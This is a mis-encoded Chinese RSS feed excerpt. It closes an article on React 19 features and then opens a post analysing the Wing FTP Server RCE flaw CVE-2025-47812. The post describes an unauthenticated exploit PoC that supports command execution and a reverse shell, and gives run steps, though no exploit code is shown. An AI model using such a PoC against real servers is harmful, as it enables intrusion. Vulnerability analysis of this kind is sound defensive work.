  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> };
  }
}

<span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨ï¼ˆcomponents/ProfileForm.tsxï¼‰</span>
<span class="hljs-keyword">import</span> { useActionState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { updateUserProfile } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/actions/user'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">ProfileForm</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">const</span> [state, formAction, isPending] = <span class="hljs-title function_">useActionState</span>(updateUserProfile, { user });
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">{formAction}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">disabled</span>=<span class="hljs-string">{isPending}</span>&gt;</span>{isPending ? 'ä¿å­˜ä¸­...' : 'ä¿å­˜'}<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      {state.error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"error"</span>&gt;</span>{state.error}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-4">â€‹<strong>3. React ç¼–è¯‘å™¨ï¼šè‡ªåŠ¨ä¼˜åŒ–çš„â€œæ€§èƒ½é­”æ³•â€â€‹</strong>â€‹</h4>
<p>React 19 å¼•å…¥<strong>å†…ç½®ç¼–è¯‘å™¨</strong>ï¼Œé€šè¿‡<strong>é™æ€åˆ†æ</strong>ä¸<strong>æ™ºèƒ½è®°å¿†ï¼ˆMemoizationï¼‰â€‹</strong>ï¼Œè‡ªåŠ¨ä¼˜åŒ–ç»„ä»¶æ¸²æŸ“ï¼Œâ€‹<strong>æ¶ˆé™¤æ‰‹åŠ¨Â <code>useMemo</code>/<code>useCallback</code>Â çš„å†—ä½™ä»£ç </strong>ã€‚</p>
<ul>
<li>
<p>â€‹<strong>æ ¸å¿ƒä¼˜åŠ¿</strong>â€‹ï¼š</p>
<ul>
<li>â€‹<strong>è‡ªåŠ¨ä¾èµ–è¿½è¸ª</strong>â€‹ï¼šç¼–è¯‘å™¨ä¼šåˆ†æç»„ä»¶çš„<strong>æ•°æ®æµ</strong>ä¸<strong>ä¾èµ–å…³ç³»</strong>ï¼Œè‡ªåŠ¨è¯†åˆ«éœ€è¦ memo åŒ–çš„è®¡ç®—ï¼ˆå¦‚å¤æ‚è¿‡æ»¤ã€æ’åºï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨æ·»åŠ Â <code>useMemo</code>ã€‚</li>
<li>â€‹<strong>å‡å°‘å†…å­˜å¼€é”€</strong>â€‹ï¼šé¿å…è¿‡åº¦ç¼“å­˜ï¼ˆå¦‚ç®€å•è®¡ç®—çš„Â <code>useMemo</code>ï¼‰ï¼Œå‡å°‘å†…å­˜å ç”¨ã€‚</li>
<li>â€‹<strong>ä»£ç ç®€åŒ–</strong>â€‹ï¼šç§»é™¤å¤§é‡Â <code>useMemo</code>/<code>useCallback</code>Â ä»£ç ï¼Œä½¿ç»„ä»¶é€»è¾‘æ›´æ¸…æ™°ã€‚</li>
</ul>
</li>
<li>
<p>â€‹<strong>ç¤ºä¾‹</strong>â€‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// React 18ï¼šæ‰‹åŠ¨ memo åŒ–</span>
<span class="hljs-keyword">const</span> filteredProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-title function_">matchesFilters</span>(p, filters)), [products, filters]);
<span class="hljs-keyword">const</span> handleSort = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">sortBy</span>) =&gt;</span> { <span class="hljs-comment">/* æ’åºé€»è¾‘ */</span> }, []);

<span class="hljs-comment">// React 19ï¼šç¼–è¯‘å™¨è‡ªåŠ¨ä¼˜åŒ–</span>
<span class="hljs-keyword">const</span> filteredProducts = products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-title function_">matchesFilters</span>(p, filters));
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSort</span> = (<span class="hljs-params">sortBy</span>) =&gt; { <span class="hljs-comment">/* æ’åºé€»è¾‘ */</span> };
</code></pre>
</li>
</ul>
<h4 data-id="heading-5">â€‹<strong>4. æ–° Hookï¼šæå‡å¼€å‘æ•ˆç‡çš„â€œåˆ©å™¨â€â€‹</strong>â€‹</h4>
<p>React 19 æ–°å¢å¤šä¸ªå®ç”¨ Hookï¼Œè¿›ä¸€æ­¥ç®€åŒ–å¼€å‘æµç¨‹ï¼š</p>
<ul>
<li>
<p>â€‹**<code>use()</code>ï¼šç»Ÿä¸€æ•°æ®è·å–<strong>â€‹ï¼š<code>use()</code>Â Hook å¯</strong>åœ¨æ¸²æŸ“ä¸­ç›´æ¥è¯»å– Promise æˆ– Context**ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†Â <code>useEffect</code>Â æˆ–Â <code>useState</code>ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userId }</span>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">use</span>(<span class="hljs-title function_">fetchUser</span>(userId)); <span class="hljs-comment">// ç›´æ¥è¯»å– Promise</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
</li>
<li>
<p>â€‹**<code>useOptimistic()</code>ï¼šä¹è§‚æ›´æ–°ç®€åŒ–<strong>â€‹ï¼š<code>useOptimistic()</code>Â Hook å¯</strong>è‡ªåŠ¨ç®¡ç†ä¹è§‚æ›´æ–°çš„å›æ»š**ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†é”™è¯¯çŠ¶æ€ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LikeButton</span>(<span class="hljs-params">{ postId, initialLikes }</span>) {
  <span class="hljs-keyword">const</span> [likes, addOptimisticLike] = <span class="hljs-title function_">useOptimistic</span>(initialLikes, <span class="hljs-function">(<span class="hljs-params">current</span>) =&gt;</span> current + <span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLike</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">addOptimisticLike</span>(); <span class="hljs-comment">// ç«‹å³æ›´æ–° UI</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">likePost</span>(postId); <span class="hljs-comment">// æäº¤è¯·æ±‚</span>
  };
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLike}</span>&gt;</span>â¤ï¸ {likes}<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">â€‹<strong>äºŒã€React 19 ä¸ React 18 çš„ä¼˜åŒ–å¯¹æ¯”</strong>â€‹</h3>
<p>React 19 çš„ä¼˜åŒ–<strong>å¹¶éå¢é‡è°ƒæ•´</strong>ï¼Œè€Œæ˜¯<strong>æ¶æ„çº§çš„é©æ–°</strong>ï¼Œä»¥ä¸‹æ˜¯ä¸ React 18 çš„å…³é”®å·®å¼‚ï¼š</p>
<h4 data-id="heading-7">â€‹<strong>1. æ€§èƒ½ä¼˜åŒ–ï¼šä»â€œæ‰‹åŠ¨è°ƒä¼˜â€åˆ°â€œè‡ªåŠ¨ä¼˜åŒ–â€â€‹</strong>â€‹</h4>



































<table><thead><tr><th>â€‹<strong>ç»´åº¦</strong>â€‹</th><th>â€‹<strong>React 18</strong>â€‹</th><th>â€‹<strong>React 19</strong>â€‹</th><th>â€‹<strong>ä¼˜åŒ–æ•ˆæœ</strong>â€‹</th></tr></thead><tbody><tr><td>â€‹<strong>åˆå§‹æ¸²æŸ“</strong>â€‹</td><td>ä¾èµ–æ‰‹åŠ¨Â <code>React.memo</code>/<code>useMemo</code></td><td>ç¼–è¯‘å™¨è‡ªåŠ¨ memo åŒ–</td><td>åˆå§‹æ¸²æŸ“é€Ÿåº¦æå‡ 40%</td></tr><tr><td>â€‹<strong>é‡æ–°æ¸²æŸ“</strong>â€‹</td><td>æ˜“å‡ºç°â€œæ— æ•ˆé‡æ¸²æŸ“â€ï¼ˆå¦‚ props å¼•ç”¨å˜åŒ–ï¼‰</td><td>ç¼–è¯‘å™¨è‡ªåŠ¨è¿½è¸ªä¾èµ–ï¼Œé¿å…æ— æ•ˆé‡æ¸²æŸ“</td><td>é‡æ–°æ¸²æŸ“æ¬¡æ•°å‡å°‘ 66%</td></tr><tr><td>â€‹<strong>Bundle å¤§å°</strong>â€‹</td><td>åŒ…å«æœåŠ¡å™¨ç»„ä»¶ä»£ç ï¼ˆå¦‚Â <code>getServerSideProps</code>ï¼‰</td><td>æœåŠ¡å™¨ç»„ä»¶é›¶å®¢æˆ·ç«¯ bundle å¢é•¿</td><td>Bundle ä½“ç§¯å‡å°‘ 15%-30%</td></tr><tr><td>â€‹<strong>å†…å­˜å ç”¨</strong>â€‹</td><td>è¿‡åº¦ç¼“å­˜å¯¼è‡´å†…å­˜å¼€é”€</td><td>æŒ‰éœ€ä¼˜åŒ–ï¼Œå‡å°‘å†—ä½™ç¼“å­˜</td><td>å†…å­˜å ç”¨å‡å°‘ 33%</td></tr></tbody></table>
<h4 data-id="heading-8">â€‹<strong>2. å¼€å‘ä½“éªŒï¼šä»â€œå†—ä½™ä»£ç â€åˆ°â€œç®€æ´é€»è¾‘â€â€‹</strong>â€‹</h4>
<ul>
<li>â€‹<strong>æ•°æ®è·å–</strong>â€‹ï¼šReact 18 éœ€æ‰‹åŠ¨ç¼–å†™Â <code>useEffect</code>Â +Â <code>fetch</code>Â +Â <code>useState</code>ï¼Œè€Œ React 19 é€šè¿‡Â <code>use()</code>Â Hook ä¸æœåŠ¡å™¨ç»„ä»¶ï¼Œâ€‹<strong>æ¶ˆé™¤æ•°æ®è·å–çš„æ ·æ¿ä»£ç </strong>ã€‚</li>
<li>â€‹<strong>è¡¨å•å¤„ç†</strong>â€‹ï¼šReact 18 éœ€æ‰‹åŠ¨ç®¡ç†Â <code>isSubmitting</code>ã€<code>error</code>Â ç­‰çŠ¶æ€ï¼Œè€Œ React 19 é€šè¿‡Â <code>useActionState</code>Â Hookï¼Œâ€‹<strong>ä¸€è¡Œä»£ç æå®šè¡¨å•æäº¤</strong>ã€‚</li>
<li>â€‹<strong>çŠ¶æ€ç®¡ç†</strong>â€‹ï¼šReact 18 éœ€æ‰‹åŠ¨ä½¿ç”¨Â <code>useMemo</code>/<code>useCallback</code>Â ä¼˜åŒ–çŠ¶æ€ï¼Œè€Œ React 19 é€šè¿‡ç¼–è¯‘å™¨<strong>è‡ªåŠ¨ä¼˜åŒ–</strong>ï¼Œå‡å°‘çŠ¶æ€ç®¡ç†çš„å¤æ‚åº¦ã€‚</li>
</ul>
<h4 data-id="heading-9">â€‹<strong>3. æ¶æ„æ¨¡å¼ï¼šä»â€œå®¢æˆ·ç«¯ä¸»å¯¼â€åˆ°â€œæœåŠ¡å™¨ä¼˜å…ˆâ€â€‹</strong>â€‹</h4>
<p>React 18 çš„æ¶æ„ä»¥<strong>å®¢æˆ·ç«¯ä¸ºä¸­å¿ƒ</strong>ï¼Œæ•°æ®è·å–ã€è®¡ç®—å‡åœ¨å®¢æˆ·ç«¯å®Œæˆï¼›è€Œ React 19 é‡‡ç”¨<strong>æœåŠ¡å™¨ä¼˜å…ˆ</strong>çš„æ¶æ„ï¼Œé€šè¿‡æœåŠ¡å™¨ç»„ä»¶å°†æ•°æ®è·å–ã€è®¡ç®—ç§»è‡³æœåŠ¡å™¨ç«¯ï¼Œâ€‹<strong>å‡å°‘å®¢æˆ·ç«¯è´Ÿæ‹…</strong>ã€‚è¿™ç§æ¶æ„æ¨¡å¼çš„è½¬å˜ï¼Œâ€‹<strong>å½»åº•è§£å†³äº† React åº”ç”¨çš„â€œé¦–å±åŠ è½½æ…¢â€é—®é¢˜</strong>ã€‚</p>
<h3 data-id="heading-10">â€‹<strong>ä¸‰ã€React 19 è¿ç§»æŒ‡å—ä¸æ³¨æ„äº‹é¡¹</strong>â€‹</h3>
<h4 data-id="heading-11">â€‹<strong>1. è¿ç§»æ­¥éª¤</strong>â€‹</h4>
<ul>
<li>â€‹<strong>æ›´æ–°ä¾èµ–</strong>â€‹ï¼šå°†Â <code>react</code>ã€<code>react-dom</code>Â å‡çº§è‡³ 19 ç‰ˆæœ¬ã€‚</li>
<li>â€‹<strong>ç§»é™¤åºŸå¼ƒ API</strong>â€‹ï¼šåˆ é™¤Â <code>findDOMNode()</code>ã€<code>Legacy Context API</code>ã€<code>String refs</code>Â ç­‰åºŸå¼ƒ APIã€‚</li>
<li>â€‹<strong>é€‚é…æœåŠ¡å™¨ç»„ä»¶</strong>â€‹ï¼šå°†éƒ¨åˆ†å®¢æˆ·ç«¯ç»„ä»¶è¿ç§»è‡³æœåŠ¡å™¨ç«¯ï¼ˆå¦‚æ•°æ®å¯†é›†å‹ç»„ä»¶ï¼‰ï¼Œä½¿ç”¨Â <code>'use server'</code>Â æŒ‡ä»¤æ ‡è®°æœåŠ¡å™¨ç»„ä»¶ã€‚</li>
<li>â€‹<strong>é€æ­¥é‡‡ç”¨æ–°ç‰¹æ€§</strong>â€‹ï¼šå…ˆä½¿ç”¨Â <code>useActionState</code>ã€<code>useOptimistic</code>Â ç­‰æ–° Hookï¼Œå†é€æ­¥è¿ç§»è‡³æœåŠ¡å™¨ç»„ä»¶ã€‚</li>
</ul>
<h4 data-id="heading-12">â€‹<strong>2. æ³¨æ„äº‹é¡¹</strong>â€‹</h4>
<ul>
<li>â€‹<strong>æœåŠ¡å™¨ç»„ä»¶é™åˆ¶</strong>â€‹ï¼šæœåŠ¡å™¨ç»„ä»¶æ— æ³•ä½¿ç”¨å®¢æˆ·ç«¯ APIï¼ˆå¦‚Â <code>window</code>ã€<code>localStorage</code>ï¼‰ï¼Œéœ€é€šè¿‡å®¢æˆ·ç«¯ç»„ä»¶å°è£…ã€‚</li>
<li>â€‹<strong>ç¬¬ä¸‰æ–¹åº“å…¼å®¹æ€§</strong>â€‹ï¼šéƒ¨åˆ†ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚Â <code>redux</code>ã€<code>mobx</code>ï¼‰å¯èƒ½éœ€è¦æ›´æ–°è‡³æ”¯æŒ React 19 çš„ç‰ˆæœ¬ã€‚</li>
<li>â€‹<strong>æ€§èƒ½æµ‹è¯•</strong>â€‹ï¼šè¿ç§»åéœ€è¿›è¡Œæ€§èƒ½æµ‹è¯•ï¼Œç¡®ä¿ä¼˜åŒ–æ•ˆæœç¬¦åˆé¢„æœŸã€‚</li>
</ul>
<h3 data-id="heading-13">â€‹<strong>å››ã€æ€»ç»“ï¼šReact 19 æ˜¯â€œæœªæ¥ React å¼€å‘â€çš„èµ·ç‚¹</strong>â€‹</h3>
<p>React 19 çš„<strong>æ ¸å¿ƒä»·å€¼</strong>åœ¨äº<strong>å°†æ€§èƒ½ä¼˜åŒ–ä¸å¼€å‘ä½“éªŒæå‡åˆ°äº†æ–°é«˜åº¦</strong>â€‹ï¼š</p>
<ul>
<li>é€šè¿‡<strong>æœåŠ¡å™¨ç»„ä»¶</strong>è§£å†³äº†â€œé¦–å±åŠ è½½æ…¢â€çš„ç—›ç‚¹ï¼›</li>
<li>é€šè¿‡<strong>Actions API</strong>æ¶ˆé™¤äº†æ•°æ®å˜æ›´çš„æ ·æ¿ä»£ç ï¼›</li>
<li>é€šè¿‡<strong>ç¼–è¯‘å™¨</strong>å®ç°äº†è‡ªåŠ¨ä¼˜åŒ–ï¼Œå‡å°‘äº†æ‰‹åŠ¨è°ƒä¼˜çš„å·¥ä½œé‡ã€‚</li>
</ul>
<p>å¯¹äºå¼€å‘è€…è€Œè¨€ï¼ŒReact 19 ä¸æ˜¯â€œå¯é€‰çš„å‡çº§â€ï¼Œè€Œæ˜¯â€œå¿…é¡»æ‹¥æŠ±çš„æœªæ¥â€â€”â€”å®ƒå°†å¸®åŠ©å¼€å‘è€…æ„å»º<strong>æ›´å¿«é€Ÿã€æ›´ç®€æ´ã€æ›´æ˜“ç»´æŠ¤</strong>çš„ React åº”ç”¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CVE-2025-47812ï¼šWing FTP Server é«˜å±RCEæ¼æ´åˆ†æä¸åˆ©ç”¨]]></title>    <link>https://juejin.cn/post/7604142616475189254</link>    <guid>https://juejin.cn/post/7604142616475189254</guid>    <pubDate>2026-02-09T09:34:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604142616475189254" data-draft-id="7604279756599771172" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CVE-2025-47812ï¼šWing FTP Server é«˜å±RCEæ¼æ´åˆ†æä¸åˆ©ç”¨"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-02-09T09:34:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CVE-2025-47812ï¼šWing FTP Server é«˜å±RCEæ¼æ´åˆ†æä¸åˆ©ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:34:02.000Z" title="Mon Feb 09 2026 09:34:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">é¡¹ç›®æ ‡é¢˜ä¸æè¿°</h3>
<p><strong>CVE-2025-47812 â€“ Wing FTP Server è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong></p>
<p>CVE-2025-47812 æ˜¯é’ˆå¯¹ Wing FTP Serverï¼ˆç‰ˆæœ¬ 7.4.4 ä¹‹å‰ï¼‰çš„ä¸€ä¸ª<strong>ä¸¥é‡ï¼ˆCriticalï¼‰çš„æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´</strong>ã€‚è¯¥æ¼æ´å·²è¢«å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°å¹¶è¯å®å­˜åœ¨é‡å¤–ï¼ˆin the wildï¼‰çš„ä¸»åŠ¨åˆ©ç”¨è¡Œä¸ºã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œè·å¾— SYSTEMï¼ˆWindowsï¼‰æˆ– rootï¼ˆLinux/macOSï¼‰æƒé™ã€‚æœ¬é¡¹ç›®æä¾›äº†ä¸€ä¸ªç”¨äºéªŒè¯è¯¥æ¼æ´çš„æ¦‚å¿µè¯æ˜ï¼ˆPoCï¼‰è„šæœ¬ï¼Œå¹¶è¯¦ç»†é˜è¿°äº†å…¶æ ¹æœ¬åŸå› å’Œç¼“è§£æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-1">åŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>æ¼æ´å¤ç°</strong>ï¼šé€šè¿‡æ„é€ ç‰¹æ®Šçš„ç”¨æˆ·åå‚æ•°ï¼Œåœ¨æœªæˆæƒæˆ–åŒ¿åè®¤è¯æƒ…å†µä¸‹è§¦å‘RCEã€‚</li>
<li><strong>å¤šå¹³å°æ”¯æŒ</strong>ï¼šé€‚ç”¨äº Windowsã€Linux å’Œ macOS å¹³å°ä¸Šçš„å—å½±å“ Wing FTP Serverã€‚</li>
<li><strong>çµæ´»çš„æ”»å‡»è½½è·</strong>ï¼š
<ul>
<li>æ”¯æŒç›´æ¥æ‰§è¡Œå•æ¡ç³»ç»Ÿå‘½ä»¤ã€‚</li>
<li>æ”¯æŒè·å–åå‘ Shellã€‚</li>
</ul>
</li>
<li><strong>è‡ªåŠ¨åŒ–åˆ©ç”¨</strong>ï¼šè„šæœ¬è‡ªåŠ¨å¤„ç†ä¼šè¯è·å–ï¼ˆUIDï¼‰ã€Payloadæ³¨å…¥å’Œç»“æœæå–çš„å®Œæ•´æµç¨‹ã€‚</li>
<li><strong>é«˜å±å®³æ€§</strong>ï¼šæ¼æ´åˆ©ç”¨æ— éœ€èº«ä»½éªŒè¯ï¼Œä¸”æ”»å‡»ä»£ç åœ¨æœåŠ¡å™¨ä¸Šä»¥æœ€é«˜æƒé™è¿è¡Œï¼ˆCVSS è¯„åˆ† 10.0ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2">å®‰è£…æŒ‡å—</h3>
<p>æœ¬ PoC è„šæœ¬åŸºäº Python 3 ç¼–å†™ï¼Œä¾èµ–æ ‡å‡†åº“ï¼Œæ— éœ€é¢å¤–å®‰è£…ç¬¬ä¸‰æ–¹åŒ…ã€‚</p>
<p><strong>ç³»ç»Ÿè¦æ±‚ä¸ä¾èµ–</strong>ï¼š</p>
<ul>
<li>Python 3.x</li>
<li><code>requests</code> åº“ï¼ˆé€šå¸¸ä¸ºæ ‡å‡†åº“çš„ä¸€éƒ¨åˆ†ï¼Œè‹¥ç¼ºå¤±å¯ä½¿ç”¨ <code>pip install requests</code> å®‰è£…ï¼‰</li>
<li>ç½‘ç»œè®¿é—®æƒé™ï¼ˆå¯è®¿é—®ç›®æ ‡ Wing FTP Server çš„ Web ç®¡ç†æ¥å£ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨æ­¥éª¤</strong>ï¼š</p>
<ol>
<li>ç¡®ä¿æ‚¨çš„ Python 3 ç¯å¢ƒå·²å°±ç»ªã€‚</li>
<li>å°†æä¾›çš„ Python è„šæœ¬ä¿å­˜ä¸º <code>CVE-2025-47812.py</code>ã€‚</li>
<li>åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œè„šæœ¬ï¼š<code>python3 CVE-2025-47812.py</code>ã€‚</li>
</ol>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
